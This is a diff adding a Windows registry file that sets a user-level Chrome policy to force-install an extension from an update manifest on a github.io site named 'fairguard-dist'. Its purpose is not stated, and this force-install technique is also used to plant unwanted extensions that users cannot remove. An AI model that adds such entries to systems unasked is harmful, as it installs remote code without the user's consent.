@@ -1,0 +1,4 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist]
+"1"="iojgjfjlnhnbkfnjgklopolplncnhalc;https://mnfaiwork-ops.github.io/fairguard-dist/update.xml"
